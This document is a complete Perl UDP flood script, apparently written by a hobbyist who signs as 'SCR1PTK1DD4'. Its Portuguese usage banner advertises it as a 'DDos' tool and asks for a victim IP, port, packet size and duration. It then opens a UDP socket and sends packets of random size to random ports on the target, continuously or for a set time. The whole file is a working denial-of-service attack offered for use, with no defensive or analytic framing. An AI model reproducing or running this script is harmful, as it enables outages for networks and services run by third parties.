#!/usr/bin/perl
 
#   ____   ____ ____  _ ____ _____ _  ___ ____  ____  _  _   
#  / ___| / ___|  _ \/ |  _ \_   _| |/ / |  _ \|  _ \| || |  
#  \___ \| |   | |_) | | |_) || | | ' /| | | | | | | | || |_ 
#   ___) | |___|  _ <| |  __/ | | | . \| | |_| | |_| |__   _|
#  |____/ \____|_| \_\_|_|    |_| |_|\_\_|____/|____/   |_|  
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "#################################\n";
  print "#    FlooD Net / DDos / UdP     #\n";
  print "#              by               #\n";
  print "#         SCR1PTK1DD4           #\n";
  print "#################################\n\n";
  print " Porta = 0: Usar Portas aleatorias\n";
  print " Pacotes = 0: Usar entre 64 e 65500 Pacotes aleatorios\n";
  print " Tempo = 0: Ataque continuo\n";
  print " Exemplo = perl Brut.pl IPVITIMA 80 65500 0\n\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "IP inválido: $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print "Atacando o IP e Porta $ip " . ($port ? $port : "random") . " com " .
  ($size ? "$size-bytes" : "random size") . " de pacotes" .
  ($time ? " por $time segundos" : "") . "\n";
print "
########################
#  ATACANDO IP - Host  #
#   CTRL + C = STOP    #
#         By           #
#     SCR1PTK1DD4      #
######################## \n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
